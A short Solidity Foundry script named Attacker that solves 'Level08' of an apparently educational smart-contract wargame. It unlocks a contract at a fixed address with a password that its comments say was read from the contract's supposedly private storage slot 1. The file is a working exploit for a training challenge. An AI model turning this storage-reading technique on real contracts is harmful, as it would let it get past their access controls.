// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level08.sol";

contract Attacker is Script {
    Level08 level08 = Level08(0x6E1930fA3d29d183450DB283cF91F17EF4c16474);

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      // use readme to cast variable of a contract on chain, password is on slot 1
      // call unlock with variable received from cast
      level08.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
      console.log(level08.locked());
      vm.stopBroadcast();
    }
}
